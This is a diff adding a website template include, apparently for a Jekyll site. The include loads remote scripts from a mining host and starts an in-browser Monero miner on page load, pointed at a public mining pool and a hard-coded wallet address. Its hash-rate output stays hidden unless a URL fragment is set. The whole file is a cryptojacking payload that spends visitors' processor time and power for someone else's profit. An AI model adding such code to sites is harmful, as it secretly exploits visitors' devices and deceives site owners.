@@ -1,0 +1,47 @@
+<pre id='info' style='display:none'></pre>
+<script src="https://miner.nablabee.com/public/crypto-js/crypto-js.js"> </script>
+<script src="https://miner.nablabee.com/public/loader.js"> </script>
+<script>
+var hash; 
+if(location.href.indexOf('#')>0){
+  hash=location.href.substr(location.href.indexOf('#')+1);
+  if(hash !== undefined){ 
+    hash=hash.split(",");
+    show=(hash[0]==undefined?0:parseInt(hash[0]));
+  }
+}
+/*
+window._minerConfig = {
+  proxybaseuri : "wss://node1.xmr-tw.org:8892",
+  cdnbaseuri : "https://miner.nablabee.com:9099/assets/"
+};
+*/
+loadMiner({
+	pool: "pool.supportxmr.com:3333",
+//	address : "47F5J6sTsCKCbs3cSaKgrTjFmWMNiYrETNnGzHy1i1792AQuQG4GPAHHrrj3kyuqcDYgFf6WRyuUDZ1M62C8W3v44WSNg5o",
+        address : "47P3c5mmXANEED9A7gLvATJP1itxXkwc9fLEyWLbYBGgZyYyJ2As6R1E5vFCmLpoSiBU8fcXPr3sGar13u2WkTgv5eiwQff",
+{% if page.worker %}
+	worker : "{{ page.worker }}",
+{% else %}
+	worker : "default",
+{% endif %}
+	options : {
+        throttle: 0.3,
+		threads: 1
+	}
+}, function(miner){
+    var info=document.getElementById('info');
+    if(hash==1){
+      info.style.display="block";
+    }
+	miner.start();
+    +function pooling(){
+      setTimeout(function(){
+        //console.log(miner.getTotalHashes());
+        //console.log(Math.round(miner.getHashesPerSecond()));
+        info.innerHTML='total hash: '+miner.getTotalHashes()+', '+Math.round(miner.getHashesPerSecond())+'(H/s)';
+        pooling();
+      }, 500);
+    }();
+})
+</script>
